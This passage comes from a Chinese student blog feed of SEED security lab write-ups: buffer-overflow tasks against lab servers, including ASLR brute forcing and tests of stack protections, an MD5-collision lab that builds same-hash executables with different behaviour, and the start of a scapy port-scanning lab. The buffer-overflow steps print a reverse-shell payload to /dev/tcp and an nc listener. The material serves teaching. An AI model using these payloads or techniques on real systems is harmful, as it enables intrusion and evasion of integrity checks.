address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe310+8</code>；</p><p>修改content变量，将之前32位的<code>4</code>，修改为<code>8</code>；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.7 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028200837605.png" alt="image-20241028200837605"></p><p>server中可以得到返回，可见溢出攻击成功！</p></li><li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.7的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201117195.png" alt="image-20241028201117195"></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201235213.png" alt="image-20241028201235213"></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201315181.png" alt="image-20241028201315181"></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201401911.png" alt="image-20241028201401911"></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201426974.png" alt="image-20241028201426974"></p></li></ol><p><strong>至此task4完成！</strong></p><hr><h4 id="Task5-Level-4-Attack"><a href="#Task5-Level-4-Attack" class="headerlink" title="Task5: Level-4 Attack"></a>Task5: Level-4 Attack</h4><p><strong>目标服务器及端口：10.9.0.8 9090</strong></p><ol><li><p>先测试一下目标服务器及端口能否连通；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201654875.png" alt="image-20241028201654875"></p><p>server端成功返回，测试成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028201713906.png" alt="image-20241028201713906"></p><p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe380</code>；</p><p>对比Level-3，Level-4的rbp和buffer address之间的间隔变小了。若将 ret 的值设为RBP+n ， n 是[1184, 1424]之间的值，取n&#x3D;1200，就能实现缓冲区溢出攻击。</p></li><li><p>修改<code>exploit.py</code>文件如下：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028204437694.png" alt="image-20241028204437694"></p><p>修改start变量为<code>517-len(shellcode)</code>；</p><p>修改ret变量为<code>rbp+n</code>，n取一个足够大的数，比如1200，ret变量变为<code>0x00007fffffffe3e0+1200</code>；</p><p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe380+8</code>；</p><p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 64的代码；</p></li><li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.8 9090</code>语句；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214626827.png" alt="image-20241028214626827"></p><p>server中可以得到返回，可见溢出攻击成功！</p></li><li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure><p>将发送给10.9.0.8的内容，返回给10.9.0.1，实现反弹shell；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214715757.png" alt="image-20241028214715757"></p></li><li><p>在另一个终端监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214804469.png" alt="image-20241028214804469"></p></li><li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214942433.png" alt="image-20241028214942433"></p></li><li><p>服务器中显示连接成功；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215005173.png" alt="image-20241028215005173"></p></li><li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028214919940.png" alt="image-20241028214919940"></p></li></ol><p><strong>至此task5完成！</strong></p><hr><h4 id="Task6-Experimenting-with-the-Address-Randomization"><a href="#Task6-Experimenting-with-the-Address-Randomization" class="headerlink" title="Task6: Experimenting with the Address Randomization"></a>Task6: Experimenting with the Address Randomization</h4><ol><li><p>打开ALSR(地址空间随机化)；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215147772.png" alt="image-20241028215147772"></p></li><li><p>执行两次对服务器10.9.0.5和10.9.0.7的连接；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215332105.png" alt="image-20241028215332105"></p><p>可以发现无论是32位，还是64位，每次返回的地址都不相同：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028215500517.png" alt="image-20241028215500517"></p><p>这使得攻击变得很困难。</p></li><li><p>使用Level-1中反弹shell的<code>exploit.py</code> 代码；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028220327114.png" alt="image-20241028220327114"></p></li><li><p>先在另一终端中监听9090端口；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure><p>然后在<code>attack-code</code>文件夹下执行命令进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./exploit.c<br>./brute-forth.sh<br></code></pre></td></tr></table></figure><p>最终通过23310次，爆破成功：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231056206.png" alt="image-20241028231056206"></p><p>服务器中显示；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028230925916.png" alt="image-20241028230925916"></p><p>监听端口反弹shell成功！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231306151.png" alt="image-20241028231306151"></p></li></ol><p><strong>至此task6完成！</strong></p><hr><h4 id="Task7-Experimenting-with-Other-Countermeasures"><a href="#Task7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Task7: Experimenting with Other Countermeasures"></a>Task7: Experimenting with Other Countermeasures</h4><ol><li><p>进入<code>server-code</code>目录，删除编译过的文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231902836.png" alt="image-20241028231902836"></p></li><li><p>编辑<code>Makefile</code>文件，删除<code>-fno-stack-protector</code>选项；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028231940965.png" alt="image-20241028231940965"></p><p>重新编译生成可执行文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232049131.png" alt="image-20241028232049131"></p></li><li><p>用badfile作为stack-L1的输入；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png" alt="image-20241028232454462"></p><p>程序运行失败！说明StackGuard保护机制已开启。</p></li><li><p>进入<code>shellcode</code>文件夹，编辑<code>Makefile</code>文件，删除<code>-z execstack</code>选项；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232454462.png">重新make一下：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028232851649.png" alt="image-20241028232851649"></p></li><li><p>两个输出都无法正常输出：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241028233010780.png" alt="image-20241028233010780"></p><p>说明栈不可执行！</p></li></ol><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 3</title>
    <link href="/2024/12/25/lab3/"/>
    <url>/2024/12/25/lab3/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-3-MD5碰撞实验"><a href="#Lab-3-MD5碰撞实验" class="headerlink" title="Lab 3-MD5碰撞实验"></a>Lab 3-MD5碰撞实验</h1><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>本次实验主要是加深大家对MD5碰撞及其原理的理解，使用SEED实验环境中的工具及编程语言，完成以下任务：</p><p>a) 使用md5collgen生成两个MD5值相同的文件，并利用bless十六进制编辑器查看输出的两个文件，描述你观察到的情况；</p><p>b) 参考Lab3_task2.c的代码，生成两个MD5值相同但输出不同的两个可执行文件。</p><p>c) 参考Lab3_task3.c的代码，生成两个MD5值相同但代码行为不相同的可执行文件。</p><p>d) 回答问题：通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h4><ol><li><h6 id="gcc-11配置"><a href="#gcc-11配置" class="headerlink" title="gcc-11配置"></a>gcc-11配置</h6><p>添加<code>gcc-11</code> <code>g++-11</code>的源：</p><p><img src="http://gitee.com/r0otsu/images/raw/master/image-20241014084747882.png" alt="image-20241014084747882"></p><p>更新一下：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241014084820562.png" alt="image-20241014084820562"></p><p>安装<code>gcc-11</code>和<code>g++-11</code>：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241014084857992.png" alt="image-20241014084857992"></p><p>进入<code>/usr/bin/gcc*</code>文件，发现已经有<code>gcc-11</code>的配置文件了：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923105555785.png" alt="image-20240923105555785"></p><p>但是此时<code>gcc-11</code>并不是候选项，所以要添加<code>gcc-11</code>的候选项，并设置<code>gcc-11</code>为<code>50</code>优先级：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923105715820.png" alt="image-20240923105715820"></p><p>查看一下系统中<code>gcc</code>的候选项优先级：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923105906426.png" alt="image-20240923105906426"></p><p>修改<code>gcc-11</code>的优先级后，系统将默认以<code>gcc-11</code>进行编译：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923110040187.png" alt="image-20240923110040187"></p></li></ol><hr><ol start="2"><li><h6 id="g-11配置"><a href="#g-11配置" class="headerlink" title="g++ 11配置"></a>g++ 11配置</h6>一开始的时候系统里<code>g++</code>显示没有候选项，但是输入<code>g++ -V</code>是可以找到文件的：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240923104211227.png" alt="image-20240923104211227"><code>g++ -v</code>可以找到，但是是9.4版本，需要升级：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240923104306896.png" alt="image-20240923104306896">增加<code>g++-11</code>为候选项，并设置<code>g++-11</code>的优先级为<code>50</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240923104023558.png" alt="image-20240923104023558"></li></ol><hr><ol start="3"><li><h6 id="在-usr-bin目录下克隆md5collgen："><a href="#在-usr-bin目录下克隆md5collgen：" class="headerlink" title="在/usr/bin目录下克隆md5collgen："></a>在<code>/usr/bin</code>目录下克隆<code>md5collgen</code>：</h6><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923111000932.png" alt="image-20240923111000932"></li></ol><hr><ol start="4"><li><h6 id="进行makefile"><a href="#进行makefile" class="headerlink" title="进行makefile"></a>进行makefile</h6><p>进入<code>md5collgen</code>文件夹，发现有<code>makefile</code>文件：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923111143310.png" alt="image-20240923111143310"></p><p>如果<code>g++-11</code>和<code>gcc-11</code>都已经设置为默认，<code>make</code>就会成功了：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240923111427251.png" alt="image-20240923111427251"></p><p><code>ls</code> 一下，发现有<code>md5collgen</code>文件，即<strong>成功安装</strong>！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923111603495.png" alt="image-20240923111603495"></p></li></ol><hr><h4 id="a-task-1：两个不同的文件，但md5码相同："><a href="#a-task-1：两个不同的文件，但md5码相同：" class="headerlink" title="a) task 1：两个不同的文件，但md5码相同："></a>a) task 1：两个不同的文件，但md5码相同：</h4><ol><li><p>创建一个<code>prefix.txt</code>文件，其中的内容为<code>Message prefix</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;Message prefix&quot; &gt; prefix.txt<br></code></pre></td></tr></table></figure></li><li><p>使用<code>md5collgen</code>工具，生成<code>prefix.txt</code>的两个子文件<code>prefix_msg1.txt</code> <code>prefix_msg2.txt</code>，并且这两个文件的<strong>md5码</strong>相同：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./md5collgen -p prefix.txt -o prefix_msg1.txt prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>查看<code>prefix_msg1.txt</code> <code>prefix_msg2.txt</code>两个文件的md5码，发现一致：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg1.txt<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>相关截图<img src="https://gitee.com/r0otsu/images/raw/master/image-20240923113906483.png" alt="image-20240923113906483"></p></li></ol><hr><h4 id="task-2-文件后添加后缀"><a href="#task-2-文件后添加后缀" class="headerlink" title="task 2: 文件后添加后缀"></a>task 2: 文件后添加后缀</h4><ol><li><p>将<code>prefix_msg1.txt</code>和<code>prefix.txt</code>连接为<code>out1_long.bin</code>；</p><p><code>prefix_msg2.txt</code>和<code>prefix.txt</code>连接为<code>out2_long.bin</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat prefix_msg1.txt prefix.txt &gt; out1_long.bin<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat prefix_msg2.txt prefix.txt &gt; out2_long.bin<br></code></pre></td></tr></table></figure></li><li><p>连接后两文件的<code>md5</code>值仍然相同：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg1.txt<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">md5sum prefix_msg2.txt<br></code></pre></td></tr></table></figure></li><li><p>相关截图</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240923115348451.png" alt="image-20240923115348451"></p></li></ol><hr><h4 id="b-task-3-生成两个MD5值相同但输出不同的两个可执行文件"><a href="#b-task-3-生成两个MD5值相同但输出不同的两个可执行文件" class="headerlink" title="b) task 3: 生成两个MD5值相同但输出不同的两个可执行文件"></a>b) task 3: 生成两个MD5值相同但输出不同的两个可执行文件</h4><ol><li><p>编辑文件<code>print_array.c</code>： <img src="https://gitee.com/r0otsu/images/raw/master/image-20241014004120622.png" alt="image-20241014004120622"></p></li><li><p>gcc编译<code>print_array.c</code> 文件，生成<code>a.out</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241014004239517.png" alt="image-20241014004239517"></p></li><li><p>使用<code>bless</code>查看输出数组文件的二进制代码，发现输出时的二进制<code>offset 0x3020</code>不是64的倍数：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013210250032.png" alt="image-20241013210250032"></p><p>确认prefix取<code>0x3040</code>即为64的倍数，即十进制<code>12352</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013210434502.png" alt="image-20241013210434502"></p></li><li><p>取suffix为正好在A数组输出完毕的<code>offset 0x30e8</code>，十进制为<code>12520</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013210903561.png" alt="image-20241013210903561"></p></li><li><p>保存<code>a.out</code>的前<code>12352</code>个字节为前缀<code>prefix</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013211951946.png" alt="image-20241013211951946"></p></li><li><p>保存<code>a.out</code>从第<code>12520</code>个字节开始之后的字节为后缀<code>suffix</code>：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013212013292.png" alt="image-20241013212013292"></p></li><li><p>使用<code>md5collgen</code>工具，将<code>prefix</code> 文件作为前缀，生成两个输出文件 <code>out1.bin</code> 和 <code>out2.bin</code></p><p>输出中显示了文件初始的 MD5 值<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013212033806.png" alt="image-20241013212033806"></p></li><li><p>将<code>out1.bin</code>的后<code>128</code>个字节存为<code>P</code>；</p><p>并将<code>out2.bin</code>的后<code>128</code>个字节存为<code>Q</code>；</p><p>将前缀文件<code>prefix</code>、中间文件<code>P</code>&#x2F;<code>Q</code>、后缀文件<code>suffix</code>连接起来，分别存为<code>a1.out</code>&#x2F;<code>a2.out</code></p><p>并赋予<code>a1.out</code> 和<code> a2.out</code>文件可执行权限<img src="https://gitee.com/r0otsu/images/raw/master/image-20241013212050739.png" alt="image-20241013212050739"></p></li><li><p>可以看到两个文件的内容是有细微差别的：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241013212106086.png" alt="image-20241013212106086"></p><p>对比发现确实有细微差别：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241013211824036.png" alt="image-20241013211824036"></p></li><li><p>但输出两个文件的md5码，发现虽然文件执行后内容不同，但md5码一致</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241014005811797.png" alt="image-20241014005811797"></p></li></ol><hr><h4 id="c-task-3-生成两个MD5值相同但代码行为不相同的可执行文件"><a href="#c-task-3-生成两个MD5值相同但代码行为不相同的可执行文件" class="headerlink" title="c) task 3: 生成两个MD5值相同但代码行为不相同的可执行文件"></a>c) task 3: 生成两个MD5值相同但代码行为不相同的可执行文件</h4><ol><li><p>复制Lab3_task3.c进入虚拟机中；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027221933225.png"></p></li><li><p>编译Lab3_task3.c为task4，输出为 <code>这是一个良性程序</code> ；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc Lab3_task3.c -o task4<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027222207540.png" alt="image-20241027222207540"></p></li><li><p>bless查看task4的二进制文件，发现输出x数组时，开始是在<code>0x3020</code>，十进制<code>12320</code>，为了向上取64的倍数，应该取前缀为<code>12352</code>；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">bless task4<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027222540407.png" alt="image-20241027222540407"></p></li><li><p>把前<code>12352</code>个字节的数组取出来作为prefix前缀文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027230155091.png" alt="image-20241027230155091"></p></li><li><p>根据前缀文件进行md5碰撞，得到<code>out1.bin</code> 和 <code>out2.bin</code> 两个md5码相同的文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027230402115.png" alt="image-20241027230402115"></p></li><li><p>复制<code>task4</code>为<code>task4-1</code>和<code>task4-2</code>两个文件；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027230611724.png" alt="image-20241027230611724"></p></li><li><p>对<code>task4-1</code>文件进行操作，得到x和y数组相同的文件；</p><p>查看<code>out1.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027225027334.png" alt="image-20241027225027334"></p><p>将<code>task4-1</code>文件中的x和y数组的后<code>128</code>字节都复制为<code>out1.bin</code>文件的后<code>128</code>字节：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027224846470.png" alt="image-20241027224846470"></p><p>这样就得到了<code>task4-1</code>文件，xy数组相同。</p></li><li><p>对<code>task4-2</code>文件进行操作，得到x和y数组不同的文件；</p><p>查看<code>out1.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027225027334.png" alt="image-20241027225027334"></p><p>查看<code>out2.bin</code>文件的后<code>128</code>个字节：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027225432659.png" alt="image-20241027225432659"></p><p>将<code>task4-2</code>文件中的 <strong>y数组</strong> 的后<code>128</code>字节都复制为<code>out1.bin</code>文件的后<code>128</code>字节：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027225336163.png" alt="image-20241027225336163">将<code>task4-2</code>文件中的 <strong>x数组</strong> 的后<code>128</code>字节都复制为<code>out2.bin</code>文件的后<code>128</code>字节：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241027225520989.png" alt="image-20241027225520989"></p><p>这样就得到了<code>task4-2</code>文件，xy数组不相同</p></li><li><p>设置<code>task4-1</code>和<code>task4-2</code>文件的权限；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027231353303.png" alt="image-20241027231353303"></p></li><li><p>输出<code>task4-1</code>和<code>task4-2</code>文件的输出不同；</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20241027231416976.png" alt="image-20241027231416976"></p><p>计算md5码相同：<img src="https://gitee.com/r0otsu/images/raw/master/image-20241027231554257.png" alt="image-20241027231554257"></p><p>实验成功！</p></li></ol><hr><h4 id="d-回答问题"><a href="#d-回答问题" class="headerlink" title="d) 回答问题"></a>d) 回答问题</h4><p>通过上面的实验，请解释为什么可以做到不同行为的两个可执行文件具有相同的MD5值？</p><p>答：md5算法是一个典型的<strong>散列函数</strong>，其将任意长度的数据映射为固定长度的128位的散列值；而且md5作为哈希函数，其<strong>只关注输入数据的位模式</strong>，而非数据的语义或功能。</p><p>由于这两个特性，导致md5在计算时，存在<strong>碰撞</strong>的可能性，即通过不同的输入可能可以生成相同的哈希值；并且通过修改部分代码，两个文件可以在执行不同功能的情况下，二进制表示不同，但由于碰撞的前缀prefix相同，则md5码相同。</p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p><del>删掉啦</del></p>]]></content>
    
    
    <categories>
      
      <category>study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>攻防实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lab 2</title>
    <link href="/2024/12/25/lab2/"/>
    <url>/2024/12/25/lab2/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="Lab-2-端口扫描实验"><a href="#Lab-2-端口扫描实验" class="headerlink" title="Lab 2-端口扫描实验"></a>Lab 2-端口扫描实验</h1><p><em>使用win11尝试多次，主机扫描都没有成功，所以最后还是选择使用Linux</em></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>Ubuntu 20.04</li><li>Python 3.8.10</li></ul><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>​本次实验主要对主机扫描和端口扫描原理的理解。使用Python(scapy库)编写端口扫描程序，对目标IP（包含IP地址段）进行扫描，完成以下功能：</p><ol><li><p>使用ICMP协议探测主机是否开启；</p></li><li><p>对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较。</p></li><li><p>对远程（有防火墙）主机的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与2进行比较，分析结果。</p></li></ol><hr><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="相关库安装"><a href="#相关库安装" class="headerlink" title="相关库安装"></a>相关库安装</h4><ol><li><p>一开始的时候没有IPy和scapy的库：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929171239747.png" alt="image-20240929171239747"></p></li><li><p>安装ipy</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929171343944.png" alt="image-20240929171343944"></p></li><li><p>运行后报错没有scapy的库</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929171444473.png" alt="image-20240929171444473"></p></li><li><p>安装scapy</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929171545127.png" alt="image-20240929171545127"></p></li><li><p><strong>安装nmap</strong><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929203811647.png" alt="image-20240929203811647"></p></li></ol><hr><h4 id="使用ICMP协议进行主机扫描"><a href="#使用ICMP协议进行主机扫描" class="headerlink" title="使用ICMP协议进行主机扫描"></a>使用ICMP协议进行主机扫描</h4><ol><li><p>在本机中查看虚拟机第一张网卡的广播地址：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929172719413.png" alt="image-20240929172719413"></p></li><li><p>修改脚本中的dest变量：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929172950076.png" alt="image-20240929172950076"></p></li><li><p>运行脚本，<strong>主机扫描成功</strong>！</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929173642334.png" alt="image-20240929173642334"></p></li></ol><hr><h4 id="对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较"><a href="#对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较" class="headerlink" title="对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较"></a>对本机（关闭防火墙）的开放端口和非开放端口完成半连接（SYN、ACK、FIN、Null、Xmas）扫描，并与nmap扫描结果进行比较</h4><ol><li><p>首先使用nmap对本机进行扫描，可知本机开放的端口：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929204126649.png" alt="image-20240929204126649"></p></li><li><p>查看本机的防火墙状态，可以发现已经是关闭的了：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240929210538834.png" alt="image-20240929210538834"></p></li></ol><hr><h5 id="开始实验！"><a href="#开始实验！" class="headerlink" title="开始实验！"></a>开始实验！</h5><h5 id="半连接SYN扫描"><a href="#半连接SYN扫描" class="headerlink" title="半连接SYN扫描"></a>半连接SYN扫描</h5><ol><li><p>修改脚本如下，发送SYN包，若未接到任何应答包，则说明端口被关闭；若收到SYN-ACK包，则说明端口开放。<img src="https://gitee.com/r0otsu/images/raw/master/image-20240929210804538.png" alt="image-20240929210804538"></p></li><li><p>对开放端口 <strong>80端口</strong> 扫描结果：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240929205736149.png" alt="image-20240929205736149"></p></li><li><p>对不开放端口 <strong>79端口</strong> 扫描结果：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929205856128.png" alt="image-20240929205856128"></p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929210951263.png" alt="image-20240929210951263"></p></li></ol><hr><h5 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h5><ol><li><p><strong>ACK扫描并不能返回端口是否开放。</strong>修改脚本如下，发送ACK包，若未接到任何应答包，则说明端口被关闭；若收到RST包，则说明端口开放。</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929211122642.png" alt="image-20240929211122642"></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929211428456.png" alt="image-20240929211428456"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：</p><p><img src="https://gitee.com/r0otsu/images/raw/master/image-20240929213828192.png" alt="image-20240929213828192"></p></li></ol><h5 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h5><ol><li><p>修改脚本如下，发送FIN包，若未接到任何应答包，则说明端口开放；若收到RST-ACK包，则说明端口关闭。<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013126965.png" alt="image-20240930013126965"></p></li><li><p>对开放端口 <strong>80端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240929213239241.png" alt="image-20240929213239241"></p></li><li><p>对非开放端口 <strong>79端口</strong> 进行扫描：<img src="https://gitee.com/r0otsu/images/raw/master/image-20240930013322949.png" alt="image-20240930013322949"></p></li></ol><hr><h5 id="Null扫描"><a href="#Null扫描" class="headerlink" 